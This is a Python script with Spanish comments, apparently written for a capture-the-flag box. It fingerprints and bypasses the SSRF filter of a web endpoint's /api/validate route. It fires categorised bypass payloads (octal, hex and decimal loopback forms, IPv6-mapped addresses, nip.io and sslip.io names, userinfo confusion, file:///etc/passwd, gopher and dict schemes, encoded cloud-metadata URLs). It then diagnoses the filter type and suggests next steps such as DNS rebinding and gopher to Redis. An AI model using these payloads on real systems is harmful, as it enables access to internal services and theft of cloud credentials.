# -*- coding: utf-8 -*-
"""
filtro.py - Delimitador del filtro SSRF de POST https://domain/api/validate

Uso basico:
    python3 filtro.py --only control,privados
    python3 filtro.py --only loopback_literal,dns_loopback --threads 3 --delay 0.2
    python3 filtro.py --json salida.json

LECTURA DE RESULTADOS
---------------------
Lo que identifica el filtro es la COMBINACION de veredictos, no uno suelto:

  control = BLOQUEADO_IP en TODOS
      -> no hay egreso o allow-list estricta. Siguiente: 302 desde host
      permitido hacia 127.0.0.1, o DNS rebinding TTL 0.
  esquema = PERMITIDO en file://, gopher://
      -> el check de esquema no cubre lo que deberia.
  loopback_literal BLOQUEADO_IP + dns_loopback PERMITIDO
      -> compara el STRING y NO resuelve DNS. Siguiente: *.sslip.io.
  numericas / ipv6 = PERMITIDO
      -> filtro string-based, no normaliza. Siguiente: 2852039166, 0xA9FEA9FE.
  loopback_literal = PUERTO_CERRADO
      -> PASA el filtro, solo falta servicio. Siguiente: barrido de puertos.
  privados PERMITIDO + loopback BLOQUEADO_IP
      -> blocklist parcial. Siguiente: 10.x / 172.16-31.x.
  Si 172.160.0.1 (FUERA de /12) sale BLOQUEADO_IP
      -> el check no es CIDR, es substring "172.".

NOTA SOBRE TIMEOUTS
-------------------
El backend corta a ~6.4s (mensaje "Could not reach the source: timed out").
Un ReadTimeout del CLIENTE no es veredicto: es el harness llegando tarde, y se
reintenta a --retry-timeout (40s) antes de marcarse SIN_VEREDICTO_2INTENTOS.
Por eso --timeout vale 25s por defecto (>= 3x el corte del backend).
"""

# imports, el de siempre para un script de red
import argparse
import json
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, asdict
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple

# sin requests no hay herramienta, cortamos aqui
try:
    import requests
except ImportError:
    sys.exit("[!] te falto 'requests': pip install requests")

# el server usa cert autofirmado, apagamos el aviso de urllib3 para no llenar la terminal
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

# los veredictos
# son constantes que en lugar de escribir cadenas de texto diferentes por todo el filtro,
# se define nombres para representar posibles resultados
PERMITIDO = "PERMITIDO"
BLOQUEADO_ESQUEMA = "BLOQUEADO_ESQUEMA"
BLOQUEADO_IP = "BLOQUEADO_IP"
SIN_RESOLUCION = "SIN_RESOLUCION"
ERROR_CONEXION = "ERROR_CONEXION"
PUERTO_CERRADO = "PUERTO_CERRADO"
TIMEOUT = "TIMEOUT"
SIN_RESPUESTA_CLIENTE = "SIN_RESPUESTA_CLIENTE"
SIN_VEREDICTO_2INTENTOS = "SIN_VEREDICTO_2INTENTOS"
INDETERMINADO = "INDETERMINADO"

# tupla con todos, sirve para contar cuantos salieron de cada uno en el resumen
VEREDICTOS = (PERMITIDO, BLOQUEADO_ESQUEMA, BLOQUEADO_IP, SIN_RESOLUCION,
              ERROR_CONEXION, PUERTO_CERRADO, TIMEOUT, SIN_RESPUESTA_CLIENTE,
              SIN_VEREDICTO_2INTENTOS, INDETERMINADO)

# corte del backend medido (~6.4s) y margen antes de culpar al cliente
# util para distinguir timeout del server al cliente
BACKEND_CUT_MS = 6400
BACKEND_SLACK_MS = 2000
# frags de mensjaes que el programa busca dentro de las respuest
TOK_ESQUEMA = ("only http and https", "unknown url type", "unsupported scheme",
               "not supported", "invalid url type")
TOK_IP = ("internal or loopback", "loopback", "internal address", "private address",
          "not permitted", "reserved")
TOK_TIMEOUT = ("timed out", "timeout", "timed-out")
TOK_DNS = ("name or service not known", "getaddrinfo", "nodename nor servname",
           "temporary failure in name resolution", "no address associated with hostname",
           "name resolution", "could not resolve", "errno -2", "errno -3", "errno -5")
TOK_CONN = ("connection refused", "connection reset", "connection aborted",
            "no route to host", "network is unreachable", "remote end closed connection",
            "connection error", "broken pipe", "eof occurred", "max retries exceeded",
            "errno 111", "errno 113", "errno 101")


# payloads. {ATTACKER} y {BOX} se sustituyen en runtime
# cada categoria agrupa payloads que prueban UNA hipotesis sobre el filtro,
# no se mezclan a proposito, para que la tabla diga algo al leerla por categoria

CATEGORIAS: Dict[str, Dict[str, Any]] = {
    # hosts publicos, sirve de linea base: si esto no pasa, no hay egreso
    "control": {
        "desc": "hosts publicos - linea base de egreso",
        "payloads": [
            "http://example.com/",
            "https://example.com/",
            "http://1.1.1.1/",
            "http://neverssl.com/",
            "http://{BOX}/",
        ],
    },
    # loopback escrito tal cual, en todas las formas de mayusculas y con punto final
    "loopback_literal": {
        "desc": "loopback literal en todas sus formas",
        "payloads": [
            "http://127.0.0.1/",
            "http://127.0.0.1:80/",
            "http://localhost/",
            "http://LOCALHOST/",
            "http://LocalHost:80/",
            "http://localhost./",
            "http://127.0.0.1./",
        ],
    },
    # la misma 127.0.0.1 pero escrita en decimal, octal, hex y forma corta.
    # si alguna pasa, el filtro compara texto y no normaliza
    "numericas": {
        "desc": "codificaciones numericas de 127.0.0.1",
        "payloads": [
            "http://0/",
            "http://0.0.0.0/",
            "http://127.1/",
            "http://2130706433/",
            "http://017700000001/",
            "http://0x7f000001/",
            "http://127.0.0.10/",
            "http://127.000.000.001/",
            "http://0x7f.0.0.1/",
            "http://0177.0.0.1/",
        ],
    },
    # loopback por IPv6, incluida la mapeada que casi nadie contempla
    "ipv6": {
        "desc": "loopback en IPv6 y mapeados",
        "payloads": [
            "http://[::1]/",
            "http://[::1]:80/",
            "http://[::ffff:127.0.0.1]/",
            "http://[0:0:0:0:0:0:0:1]/",
            "http://[::ffff:7f00:1]/",
        ],
    },
    # nombres publicos que resuelven a loopback. solo sirven si el filtro NO resuelve DNS
    "dns_loopback": {
        "desc": "DNS publico que resuelve a loopback",
        "payloads": [
            "http://127.0.0.1.sslip.io/",
            "http://127.0.0.1.nip.io/",
            "http://a.127.0.0.1.nip.io/",
            "http://localtest.me/",
            "http://lvh.me/",
            "http://localhost.localdomain/",
        ],
    },
    # lio de host/userinfo: el validador puede leer un host y el cliente conectar a otro
    "userinfo": {
        "desc": "confusion host/userinfo en el parser",
        "payloads": [
            "http://x@127.0.0.1/",
            "http://localhost@{ATTACKER}/",
            "http://127.0.0.1:80@{ATTACKER}/",
            "http://{ATTACKER}@127.0.0.1/",
            "http://127.0.0.1@{ATTACKER}:80/",
        ],
    },
    # esquemas raros, para ver si el check previo de esquema esta bien hecho
    "esquema": {
        "desc": "esquemas fuera de http/https (check previo)",
        "payloads": [
            "file:///etc/passwd",
            "file:///etc/hostname",
            "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0%0A%0A",
            "data:text/plain,domain",
            "dict://127.0.0.1:11211/stat",
            "ws://127.0.0.1/",
            "ftp://127.0.0.1/",
        ],
    },
    # rangos privados y hosts internos. 172.160.0.1 es trampa: esta FUERA de /12
    "privados": {
        "desc": "rangos privados y hosts internos",
        "payloads": [
            "http://{ATTACKER}/",
            "http://{ATTACKER}:80/",
            "http://{BOX}:80/",
            "http://10.0.0.1/",
            "http://172.16.0.1/",
            "http://172.160.0.1/",
            "http://192.168.1.1/",
            "http://192.168.0.1/",
        ],
    },
    # metadata de cloud, literal y codificada. aqui el premio gordo si la caja es cloud
    "metadata": {
        "desc": "metadata de cloud (literal y codificado)",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/",
            "http://2852039166/latest/meta-data/",
            "http://0xA9FEA9FE/latest/meta-data/",
            "http://[::ffff:169.254.169.254]/latest/meta-data/",
            "http://0251.0376.0251.0376/latest/meta-data/",
        ],
    },
    # basura sintactica que rompe validadores flojos
    "ruido_parser": {
        "desc": "ruido que rompe parsers flojos",
        "payloads": [
            " http://127.0.0.1/",
            "\thttp://127.0.0.1/",
            "HTTP://127.0.0.1/",
            "HtTp://127.0.0.1/",
            "https://127.0.0.1/",
            "http:\\\\127.0.0.1\\",
            "http:////127.0.0.1/",
            "http://127.0.0.1//",
            "http://127.0.0.1/\t",
            "http://127.0.0.1/#@evil",
            "http://127.0.0.1/?x=@10.0.0.1",
            "http://127.0.0.1%00.example.com/",
        ],
    },
}

# cabeceras fijas, nos hacemos pasar por el propio front para que no nos corte por UA
HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json",
    "User-Agent": "filtro-ssrf/1.1",
}

# aqui guardamos una sesion por hilo, requests.Session no es del todo segura entre hilos
_local = threading.local()

# crear y reutilizar sesiones http

def sesion() -> requests.Session:
    s = getattr(_local, "s", None)
    if s is None:
        s = requests.Session()
        s.headers.update(HEADERS)
        _local.s = s
    return s


# guardar toda la info obtenida al probar url contra validador ssrf
@dataclass
class Resultado:
    categoria: str
    payload: str
    veredicto: str = INDETERMINADO
    status: Optional[int] = None
    ctype: str = ""
    ms: float = 0.0
    detalle: str = ""
    message: str = ""
    preview: str = ""
    intentos: int = 0
    error: str = ""
    reintento_largo: bool = False


# corta el texto para que no rompa la tabla, y aplasta saltos de linea
def recortar(texto: str, n: int = 80) -> str:
    if not texto:
        return ""
    limpio = " ".join(str(texto).split())
    return limpio[:n] + ("..." if len(limpio) > n else "")

# recibe respuesta http del server, analiza extrae datos
#  para clasificar Resultado

def parsear(resp: requests.Response) -> Tuple[Optional[bool], int, str, str, str]:
    status = resp.status_code
    ctype = resp.headers.get("content-type", "")
    # si no es json, devolvemos el texto crudo y que el clasificador decida
    try:
        data = resp.json()
    except ValueError:
        return None, status, ctype, "", (resp.text or "")[:400]
    # si el json no es un dict, tampoco hay nada que rascar
    if not isinstance(data, dict):
        return None, status, ctype, "", str(data)[:400]
    ok = data.get("ok")
    # solo nos creemos ok si es un bool de verdad
    ok = ok if isinstance(ok, bool) else None
    return ok, status, ctype, str(data.get("message") or ""), str(data.get("preview") or "")

# clasifica resultados segun devolucion

def clasificar(ok: Optional[bool], status: int, message: str, preview: str,
               ms: float = 0.0) -> str:
    m = (message or "").lower()
    # el orden importa: primero los mensajes del filtro, luego los de red
    if any(t in m for t in TOK_ESQUEMA):
        return BLOQUEADO_ESQUEMA
    if any(t in m for t in TOK_IP):
        return BLOQUEADO_IP
    if "refused" in m:
        return PUERTO_CERRADO
    if any(t in m for t in TOK_TIMEOUT):
        # el backend corta a ~6.4s; mas alla de 8.4s el que corto fue el cliente
        return SIN_RESPUESTA_CLIENTE if ms > BACKEND_CUT_MS + BACKEND_SLACK_MS else TIMEOUT
    if any(t in m for t in TOK_DNS):
        return SIN_RESOLUCION
    if any(t in m for t in TOK_CONN):
        return ERROR_CONEXION
    # ok:true es que el server llego, aunque el status sea 404
    if ok is True:
        return PERMITIDO
    # ok:false pero con preview tambien cuenta como que llego
    if ok is False:
        return PERMITIDO if preview else INDETERMINADO
    return INDETERMINADO

# enviar peticion a sistema para observar q responde el serv

def sondear(cat: str, payload: str, cfg: argparse.Namespace) -> Resultado:
    endpoint = cfg.url_base.rstrip("/") + "/api/validate"
    cuerpo = {"url": payload, "format": "csv"}
    intentos = 0
    reintento_largo = False
# preparar url a probar, enviar a server domain
# esperar respuesta, medir cuanto tarda
# interpretar resultado y guardar en Resultado.
    while True:
        intentos += 1
        if cfg.delay:
            time.sleep(cfg.delay)
        # si ya estamos en reintento largo usamos el otro timeout, mas generoso
        limite = cfg.retry_timeout if reintento_largo else cfg.timeout
        t0 = time.perf_counter()
        res: Resultado
        try:
            resp = sesion().post(endpoint, json=cuerpo, verify=False,
                                 timeout=(limite, limite), allow_redirects=True)
            ms = (time.perf_counter() - t0) * 1000.0
            ok, status, ctype, msg, prev = parsear(resp)
            res = Resultado(cat, payload, clasificar(ok, status, msg, prev, ms),
                            status, ctype, ms, recortar(msg or prev),
                            msg, prev, intentos, reintento_largo=reintento_largo)
            # solo reintentamos si el 5xx es del backend y no estamos ya en reintento largo
            if status >= 500 and intentos <= cfg.retries and not reintento_largo:
                continue
        # read timeout del cliente: el server sigue pensando, no es veredicto
        except requests.exceptions.ReadTimeout as exc:
            res = Resultado(cat, payload, SIN_RESPUESTA_CLIENTE, None, "",
                            (time.perf_counter() - t0) * 1000.0,
                            recortar(str(exc)), error=str(exc), intentos=intentos,
                            reintento_largo=reintento_largo)
        # connect timeout: ni siquiera abrimos el socket
        except requests.exceptions.ConnectTimeout as exc:
            res = Resultado(cat, payload, SIN_RESPUESTA_CLIENTE, None, "",
                            (time.perf_counter() - t0) * 1000.0,
                            recortar(str(exc)), error=str(exc), intentos=intentos,
                            reintento_largo=reintento_largo)
        # error de conexion: si dice refused es puerto cerrado, si no es otra cosa
        except requests.exceptions.ConnectionError as exc:
            v = PUERTO_CERRADO if "refused" in str(exc).lower() else ERROR_CONEXION
            res = Resultado(cat, payload, v, None, "",
                            (time.perf_counter() - t0) * 1000.0,
                            recortar(str(exc)), error=str(exc), intentos=intentos,
                            reintento_largo=reintento_largo)
        # cualquier otra movida de requests
        except requests.exceptions.RequestException as exc:
            res = Resultado(cat, payload, ERROR_CONEXION, None, "",
                            (time.perf_counter() - t0) * 1000.0,
                            recortar(str(exc)), error=str(exc), intentos=intentos,
                            reintento_largo=reintento_largo)
        # red de seguridad, el script no debe petar nunca por un payload raro
        except Exception as exc:
            res = Resultado(cat, payload, INDETERMINADO, None, "",
                            (time.perf_counter() - t0) * 1000.0,
                            recortar(f"{type(exc).__name__}: {exc}"),
                            error=str(exc), intentos=intentos,
                            reintento_largo=reintento_largo)

        # reintento largo: corte del cliente, o payload con punto final (FQDN)
        if not reintento_largo and (res.veredicto == SIN_RESPUESTA_CLIENTE
                                    or payload.rstrip("/").endswith(".")):
            reintento_largo = True
            continue
        # si tras el reintento largo sigue sin respuesta, ya no es TIMEOUT, es que no sabemos
        if reintento_largo and res.veredicto == SIN_RESPUESTA_CLIENTE:
            res.veredicto = SIN_VEREDICTO_2INTENTOS
        return res

# pura estetica, mostrar veredictos con colores en la terminal xd

def color(veredicto: str) -> str:
    # si la salida va a un pipe no metemos codigos de color, ensucian
    if not sys.stdout.isatty():
        return veredicto
    mapa = {PERMITIDO: "\033[32m", BLOQUEADO_ESQUEMA: "\033[31m",
            BLOQUEADO_IP: "\033[31m", PUERTO_CERRADO: "\033[36m",
            SIN_RESOLUCION: "\033[33m", ERROR_CONEXION: "\033[36m",
            TIMEOUT: "\033[35m", SIN_RESPUESTA_CLIENTE: "\033[35m",
            SIN_VEREDICTO_2INTENTOS: "\033[35m", INDETERMINADO: "\033[90m"}
    return f"{mapa.get(veredicto, '')}{veredicto}\033[0m"

# imprimir tabla de los resultados

def imprimir_tabla(resultados: List[Resultado], categorias: List[str]) -> None:
    # anchos fijos, se recorta lo que sobra antes de pintar
    ancho_p, ancho_s = 46, 80
    # agrupamos por categoria para no pintar todo mezclado
    por_cat: Dict[str, List[Resultado]] = {c: [] for c in categorias}
    for r in resultados:
        por_cat.setdefault(r.categoria, []).append(r)

    for cat in categorias:
        filas = por_cat.get(cat, [])
        print(f"\n[{cat}] {CATEGORIAS[cat]['desc']}  ({len(filas)} payloads)")
        print(f"  {'payload':<{ancho_p}} {'veredicto':<26} {'ms':>8}  detalle")
        print(f"  {'-' * ancho_p} {'-' * 26} {'-' * 8}  {'-' * ancho_s}")
        for r in filas:
            pay = r.payload if len(r.payload) <= ancho_p else r.payload[:ancho_p - 3] + "..."
            det = r.detalle if len(r.detalle) <= ancho_s else r.detalle[:ancho_s - 3] + "..."
            # la marca * avisa de que esa fila paso por el reintento largo
            marca = "*" if r.reintento_largo else " "
            print(f"  {pay:<{ancho_p}} {color(r.veredicto)}"
                  f"{' ' * (26 - len(r.veredicto))} {r.ms:>8.1f}{marca} {det}")


# saca la conclusion del conjunto: que tipo de filtro es y que probar despues
def resumir(resultados: List[Resultado], categorias: List[str]) -> Dict[str, Any]:
    por_cat: Dict[str, List[Resultado]] = {c: [] for c in categorias}
    for r in resultados:
        por_cat.setdefault(r.categoria, []).append(r)

    # true si en esa categoria hubo al menos un PERMITIDO
    def pasa(cat: str) -> bool:
        return any(r.veredicto == PERMITIDO for r in por_cat.get(cat, []))

    # true si TODA la categoria dio el mismo veredicto (y no esta vacia)
    def todo(cat: str, veredicto: str) -> bool:
        filas = por_cat.get(cat, [])
        return bool(filas) and all(r.veredicto == veredicto for r in filas)

    # conteo por veredicto, sale entero en el resumen aunque sea 0
    conteo = {v: sum(1 for r in resultados if r.veredicto == v) for v in VEREDICTOS}
    pasan = [c for c in categorias if pasa(c)]

    # valores por defecto si no encaja ninguna rama de abajo
    tipo, siguiente = "INDETERMINADO", "revisar manualmente el detalle de cada fila"
    notas: List[str] = []

    # ojo: el orden de estos elif es el orden de prioridad del diagnostico, no lo cambies
    if "control" in por_cat and not pasa("control") and por_cat["control"]:
        tipo = "SIN EGRESO / ALLOW-LIST ESTRICTA"
        siguiente = "302 desde host permitido hacia 127.0.0.1, o DNS rebinding TTL 0"
    elif pasa("esquema"):
        tipo = "CHECK DE ESQUEMA INCOMPLETO"
        siguiente = "file:///etc/passwd y gopher://127.0.0.1:6379/_INFO"
    elif pasa("numericas") or pasa("ipv6"):
        tipo = "FILTRO STRING-BASED (no normaliza la IP)"
        siguiente = "2852039166 y 0xA9FEA9FE contra 169.254.169.254"
        # si ademas pasa ipv6, remarcamos que el v4-mapped tambien entra
        if pasa("ipv6"):
            notas.append("IPv6 no contemplado: [::ffff:a9fe:a9fe] evade el check")
    elif pasa("dns_loopback") and not pasa("loopback_literal"):
        tipo = "FILTRO LITERAL, NO RESUELVE DNS"
        siguiente = "sslip.io/nip.io ya validados -> montar rebinding con TTL 0"
    elif pasa("userinfo") and not pasa("loopback_literal"):
        tipo = "PARSER CONFUNDIDO POR USERINFO"
        siguiente = "http://127.0.0.1:PUERTO@IP_PUBLICA/ contra servicios internos"
    elif pasa("loopback_literal"):
        tipo = "LOOPBACK NO FILTRADO"
        siguiente = "enumerar puertos en 127.0.0.1"
    elif pasa("privados"):
        tipo = "BLOCKLIST PARCIAL (solo loopback)"
        siguiente = "hosts internos 10.x / 172.16-31.x, incluida la propia caja"
    elif todo("loopback_literal", BLOQUEADO_IP) and todo("privados", BLOQUEADO_IP):
        tipo = "BLOCKLIST DE RANGOS PRIVADOS COMPLETA"
        siguiente = "302 desde host publico o DNS rebinding"
    elif conteo[ERROR_CONEXION] or conteo[PUERTO_CERRADO]:
        tipo = "PERMEABLE PERO SIN SERVICIO EN EL PUERTO"
        siguiente = "barrido de puertos sobre los hosts que no dan BLOQUEADO_IP"

    # la trampa del /12: si esta salta, el filtro no usa CIDR, usa substring
    r172 = next((r for r in por_cat.get("privados", [])
                 if r.payload.endswith("172.160.0.1/")), None)
    if r172 and r172.veredicto == BLOQUEADO_IP:
        notas.append("172.160.0.1 esta FUERA de 172.16.0.0/12 y aun asi se bloquea "
                     "-> el check no es CIDR, es substring '172.'")

    # avisamos de las filas que se quedaron sin veredicto tras el reintento
    if conteo[SIN_VEREDICTO_2INTENTOS]:
        notas.append(f"{conteo[SIN_VEREDICTO_2INTENTOS]} payload(s) sin veredicto tras "
                     "reintento a 40s: sube --timeout o revisa el egress")

    # orden de prioridad de los ganadores, los mas utiles primero
    prioridad = ["metadata", "loopback_literal", "privados", "numericas", "ipv6",
                 "dns_loopback", "userinfo", "ruido_parser", "esquema"]
    ganadores = [r.payload for c in prioridad for r in por_cat.get(c, [])
                 if r.veredicto == PERMITIDO]

    return {
        "tipo_filtro": tipo,
        "siguiente_payload": siguiente,
        "categorias_que_pasan": pasan,
        "conteo_veredictos": conteo,
        "ganadores": ganadores,
        "notas": notas,
    }


# pinta el resumen con los ganadores ya ordenados
def imprimir_resumen(res: Dict[str, Any]) -> None:
    print("\n" + "=" * 72)
    print("RESUMEN")
    print("=" * 72)
    # solo pintamos los veredictos que tengan algo, los ceros son ruido
    print("  Conteo veredictos : " +
          ", ".join(f"{k}={v}" for k, v in res["conteo_veredictos"].items() if v))
    print(f"  Categorias que pasan: {', '.join(res['categorias_que_pasan']) or '(ninguna)'}")
    print(f"  Tipo de filtro    : {res['tipo_filtro']}")
    print(f"  Siguiente payload : {res['siguiente_payload']}")
    for n in res["notas"]:
        print(f"  [!] {n}")
    # si no hay ganadores lo decimos, no dejamos el hueco vacio
    if res["ganadores"]:
        print("  Ganadores reutilizables:")
        for p in res["ganadores"]:
            print(f"    - {p}")
    else:
        print("  Ganadores reutilizables: (ninguno)")
    print("=" * 72)


# sustituye {ATTACKER} y {BOX} en todos los payloads por las ips de la config
def construir(attacker: str, box: str) -> Dict[str, List[str]]:
    return {c: [p.format(ATTACKER=attacker, BOX=box) for p in spec["payloads"]]
            for c, spec in CATEGORIAS.items()}


# argumentos de linea de comandos
def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Delimita el filtro SSRF de POST /api/validate (domain)")
    p.add_argument("--url-base", default="https://domain")
    p.add_argument("--threads", type=int, default=5)
    p.add_argument("--timeout", type=float, default=25.0,
                   help="read timeout del cliente; el backend corta a ~6.4s, manten >= 3x")
    p.add_argument("--retry-timeout", type=float, default=40.0,
                   help="timeout del reintento para corte de cliente o punto final")
    p.add_argument("--retries", type=int, default=1,
                   help="reintentos por fallo de transporte (5xx)")
    p.add_argument("--delay", type=float, default=0.0)
    p.add_argument("--only", default="",
                   help="categorias separadas por coma: " + ",".join(CATEGORIAS))
    p.add_argument("--json", dest="json_out", default="")
    p.add_argument("--attacker-ip", default="10.10.16.120")
    p.add_argument("--box-ip", default="10.129.147.91")
    p.add_argument("--list-categories", action="store_true")
    a = p.parse_args(argv)

    # saneamos los numeros, un 0 en threads o timeout rompe cosas
    a.threads = max(1, a.threads)
    a.timeout = max(0.5, a.timeout)
    a.retry_timeout = max(a.timeout, a.retry_timeout)
    a.retries = max(0, a.retries)

    # aviso si el timeout es tan bajo que el cliente corta antes que el backend
    if a.timeout <= BACKEND_CUT_MS / 1000.0 * 2:
        print(f"[!] --timeout {a.timeout:.1f}s <= 2x el corte del backend "
              f"({BACKEND_CUT_MS / 1000.0:.1f}s): veredictos enmascarados",
              file=sys.stderr)

    # listar categorias y salir, sin lanzar nada
    if a.list_categories:
        for c, spec in CATEGORIAS.items():
            print(f"{c:<18} {spec['desc']}")
        sys.exit(0)

    # --only: validamos que las categorias pedidas existan antes de gastar peticiones
    if a.only:
        pedidas = [c.strip() for c in a.only.split(",") if c.strip()]
        desconocidas = [c for c in pedidas if c not in CATEGORIAS]
        if desconocidas:
            sys.exit(f"[!] Categorias desconocidas: {', '.join(desconocidas)}")
        a.categorias = pedidas
    else:
        a.categorias = list(CATEGORIAS)
    return a


# orquesta todo: parsea args, lanza los sondeos en hilos, pinta y guarda el json
def main(argv: Optional[List[str]] = None) -> int:
    cfg = parse_args(argv)
    payloads = construir(cfg.attacker_ip, cfg.box_ip)

    # lista plana de (categoria, payload) para repartir entre los hilos
    tareas = [(c, p) for c in cfg.categorias for p in payloads[c]]
    total = len(tareas)
    print(f"[*] Endpoint : {cfg.url_base.rstrip('/')}/api/validate")
    print(f"[*] Payloads : {total} en {len(cfg.categorias)} categorias | "
          f"{cfg.threads} hilos | timeout {cfg.timeout}s -> retry {cfg.retry_timeout}s")

    resultados: List[Resultado] = []
    hechos = 0
    # el contador de progreso lo tocan varios hilos, va con lock
    lock = threading.Lock()

    # una tarea = un payload sondeado, con su contador de progreso
    def trabajo(tarea: Tuple[str, str]) -> Resultado:
        nonlocal hechos
        r = sondear(tarea[0], tarea[1], cfg)
        with lock:
            hechos += 1
            print(f"\r[*] {hechos}/{total} ...", end="", file=sys.stderr, flush=True)
        return r

    t0 = time.perf_counter()
    with ThreadPoolExecutor(max_workers=cfg.threads) as pool:
        resultados = list(pool.map(trabajo, tareas))
    duracion = time.perf_counter() - t0
    # borramos la linea del contador de progreso antes de pintar la tabla
    print("\r" + " " * 40 + "\r", end="", file=sys.stderr)

    imprimir_tabla(resultados, cfg.categorias)
    resumen = resumir(resultados, cfg.categorias)
    imprimir_resumen(resumen)
    print(f"[*] Duracion total: {duracion:.1f}s")

    # volcado a json con metadatos de la ejecucion, para comparar entre pasadas
    if cfg.json_out:
        volcado = {
            "meta": {
                "endpoint": cfg.url_base.rstrip("/") + "/api/validate",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "threads": cfg.threads, "timeout": cfg.timeout,
                "retry_timeout": cfg.retry_timeout,
                "retries": cfg.retries, "delay": cfg.delay,
                "attacker_ip": cfg.attacker_ip, "box_ip": cfg.box_ip,
            },
            "resumen": resumen,
            "resultados": [asdict(r) for r in resultados],
        }
        # si el json no se puede escribir avisamos pero no abortamos la salida
        try:
            with open(cfg.json_out, "w", encoding="utf-8") as fh:
                json.dump(volcado, fh, ensure_ascii=False, indent=2)
            print(f"[*] JSON escrito en {cfg.json_out}")
        except OSError as exc:
            print(f"[!] No se pudo escribir el JSON: {exc}")
    return 0


# entrada del script, el ctrl-c se trata aparte para no escupir traceback
if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrumpido", file=sys.stderr)
        sys.exit(130)
